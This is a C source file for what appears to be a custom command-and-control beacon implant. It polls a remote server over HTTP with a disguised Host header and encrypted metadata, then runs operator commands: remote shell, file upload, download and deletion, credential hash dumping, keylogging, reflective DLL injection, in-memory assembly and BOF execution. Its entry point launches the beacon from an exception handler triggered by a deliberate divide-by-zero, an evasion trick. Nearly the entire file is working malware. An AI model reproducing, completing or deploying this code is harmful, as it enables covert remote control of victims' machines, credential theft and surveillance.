////
#include <shobjidl.h>
#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#pragma warning(disable:4996)
#define KEY_LENGTH 32 
#include <curl/curl.h>
#include "Config.h"
#include "Command.h"
#include "Job.h"
#include <tlhelp32.h>
#include <tchar.h>

extern int SleepTime;
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16]; 
extern int clientID;



struct curl_slist* fist() {
    struct curl_slist* headers = NULL;
    EncryMetadataResult EncryMetainfos = EncryMetadata();
    unsigned char*  EncryMetainfo = EncryMetainfos.EncryMetadata;
    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;
    char* baseEncode1 = base64Encode(EncryMetainfo, EncryMetainfolen);
    //printf("base:%s\n", baseEncode1);
    // 计算headers的长度
    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);

    // 分配足够的内存空间给headers，并将metadata_header和metadata_prepend拷贝进去
    unsigned char* hea = (unsigned char*)malloc(headers_length + 1); // +1 为了存放字符串结束符'\0'
    memcpy(hea, metadata_header, strlen(metadata_header));
    memcpy(hea + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
    hea[headers_length] = '\0'; // 确保在headers末尾添加字符串结束符


    //char header[] = "Cookie: SESSIONID="; // 给定的头部字符串
    char* concatenatedString = (char*)malloc(strlen(hea) + strlen(baseEncode1) + 1);
    strcpy(concatenatedString, hea);
    strcat(concatenatedString, baseEncode1);

    headers = curl_slist_append(headers, concatenatedString);
    headers = curl_slist_append(headers, "Host:aliyun.com");
    // 执行HTTP GET请求，并设置请求头
    perform_requestresult result = perform_get_request(Http_get_uri, headers);
    printf("First Success-----------------------------------------------------------------------------------------------\n");
    while (1) {
        perform_requestresult result = perform_get_request(Http_get_uri, headers);
       
        size_t responsedatalen;


        unsigned char* responsedata = parseGetResponse(result.resqresult, result.respsize, &responsedatalen);

        printf("CONNECT HTTP Success");
        size_t jia = 0;
        int jiaci =1;
        if (responsedatalen > 4) {
            printf("\n\n进入下一阶段++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ %d\n\n", result.respsize);
            
         
            size_t dataLength = responsedatalen;
            size_t middleDataLength = dataLength - 16; // 结束偏移量

            unsigned char* key = AESRandaeskey;
          
            size_t ivLength = strlen((char*)IV);
            size_t decryptAES_CBCdatalen;
            unsigned char* decryptAES_CBCdata = AesCBCDecrypt(responsedata, key, middleDataLength ,&decryptAES_CBCdatalen);

            
            
           
            
            if (decryptAES_CBCdata != NULL) {
               
                unsigned char* lenBytesstart = decryptAES_CBCdata + 4;
                uint8_t lenBytes[4];
                memcpy(lenBytes, lenBytesstart, 4);
               
                uint32_t BiglenBytes = bigEndianUint32(lenBytes);
                unsigned char* decryptedBuf = decryptAES_CBCdata + 8;

              
                
                while (1) {
                    if (BiglenBytes <= 0) {
                        break;
                    }
                    int callbackType = 0;
                    
                    uint32_t commandType;
                    unsigned char* commandBuf;
                    size_t commandBuflen ;
                    
                    commandBuf = parsePacket(decryptedBuf, &BiglenBytes, &commandType, &commandBuflen, &jia ,&jiaci);
                    
                    unsigned char* buff = NULL;
                    size_t Bufflen;
                    switch (commandType)
                    {
                    case CMD_TYPE_SLEEP:
                        SleepTimes(commandBuf);
                        callbackType = 0;
                    case CMD_TYPE_FILE_BROWSE:
                        callbackType = 22;
                        buff = CmdFileBrowse(commandBuf,&Bufflen);
                        break;
                    case CMD_TYPE_UPLOAD_START:
                       buff = parseUpload(commandBuf, commandBuflen, &Bufflen,1);
                       callbackType = -1;
                       break;
                    case CMD_TYPE_UPLOAD_LOOP:
                        buff = parseUpload(commandBuf, commandBuflen, &Bufflen,2);
                        callbackType = -1;
                        break;
                    case  CMD_TYPE_DRIVES:
                        callbackType = 22;
                        buff = CmdDrives(commandBuf, &Bufflen);
                        break;
                    case  CMD_TYPE_MKDIR:
                        callbackType = 0;
                        buff = cmdMkdir(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case  CMD_TYPE_RM:
                        callbackType = 0;
                        buff = fileRemove(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case   CMD_TYPE_DOWNLOAD:
                        callbackType = 0;
                        buff = Download(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case CMD_TYPE_SHELL:
                        callbackType = 0;
                        buff = Cmdshell(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case CMD_TYPE_Jobs:
                        callbackType = -1;
                        beacon_jobs();
                        break;
                    case CMD_TYPE_Jobskill:
                        callbackType = -1;
                        beacon_JobKill(commandBuf, &Bufflen);;
                        break;
                    case CMD_TYPE_BOF:
                        callbackType = -1;
                        BeaconBof(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case CMD_TYPE_EXIT:
                        _exit(1);
                    case CMD_TYPE_EXECUTE_ASSEMBLY_X64:
                        callbackType = -1;
                        EXECUTE_ASSEMBLY(commandBuf, commandBuflen, 0,0);
                        break;
                    case CMD_TYPE_PIPE:
                        callbackType = -1;
                        PipeJob(commandBuf, commandBuflen, &Bufflen);
                        break;
                    case CMD_TYPE_PS:
                        callbackType = -1;
                        beacon_ps(commandBuf, commandBuflen);
                        break;
                    case CMD_TYPE_DumpHHH:
                        callbackType = -1;
                        DumpHASH();
                        break;
                    case CMD_TYPE_SPAWN_X64:
                        callbackType = -1;
                        BeaconSpawn(commandBuf, commandBuflen);
                        break;
                    case CMD_TYPE_INJECT_X86:// x86 内部反射dll注入 实现keyLogger Printscreen PsInject Screenshot Screenwatch之类的
                        callbackType = -1;
                        BeaconReflectiveDLLInject(commandBuf, commandBuflen);
                        break;
                    case CMD_TYPE_INJECT_X64:// x86 内部反射dll注入 实现keyLogger Printscreen PsInject Screenshot Screenwatch之类的
                        callbackType = -1;
                        BeaconReflectiveDLLInject(commandBuf, commandBuflen);
                        break;
                    case CMD_TYPE_KEYLOGGER:
                        callbackType = -1;
                        KEYLOGGEJob(0,commandBuf, commandBuflen,1);
                        break;
                    default:
                        callbackType = 0;
                        Bufflen = 31;
                        unsigned char result[31] = "[-] This type is No Accomplish";
                        unsigned char* resultmemmory = (unsigned char*)malloc(31);
                        memcpy(resultmemmory, result,31);
                        buff = resultmemmory;
                        break;
                    }
                    
                    printf("\n");
                    
                    if (callbackType >= 0) {
                        DataProcess(buff, Bufflen, callbackType);
                    }
                   

                }

                free(decryptAES_CBCdata);
            }
        }
        Sleep(SleepTime);
        
    }
    return headers;
    Sleep(SleepTime);
    

 }
 
 LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
 {
     //printf("ExceptionCode: %X\n", ExceptionInfo->ExceptionRecord->ExceptionCode);

     if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)
     {
         ExceptionInfo->ContextRecord->Rax = 1;
         ExceptionInfo->ContextRecord->Rcx = 1;
         DWORD currentProcessId = GetCurrentProcessId();
         Duan(currentProcessId);
         fist();

         return EXCEPTION_CONTINUE_EXECUTION;
     }

     return EXCEPTION_EXECUTE_HANDLER;
 }
int main() {
    int number = 0;
    AddVectoredExceptionHandler(TRUE, VectoredExceptionHandler);
    __try
    {
        number /= 0;
    }
    // 异常首先被 VEH 接收到，如果无法处理才会传递给 SEH
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        printf("Nonono\n");
    }

    return 0;
}

